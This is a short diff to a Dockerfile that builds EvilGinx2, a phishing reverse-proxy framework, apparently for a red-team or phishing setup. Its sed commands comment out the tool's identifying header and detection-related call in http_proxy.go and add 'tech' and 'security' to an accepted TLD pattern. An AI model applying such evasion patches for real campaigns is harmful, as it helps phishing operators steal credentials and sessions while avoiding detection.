@@ -32,9 +32,9 @@ RUN set -ex \
      -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' \
      -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go
     
-# Add "security" TLD
+# Add "security" & "tech" TLD
 RUN set -ex \
-    && sed -i 's/arpa/security\|arpa/g' ${PROJECT_DIR}/core/http_proxy.go
+    && sed -i 's/arpa/tech\|security\|arpa/g' ${PROJECT_DIR}/core/http_proxy.go
 
 # Build EvilGinx2
 WORKDIR ${PROJECT_DIR}
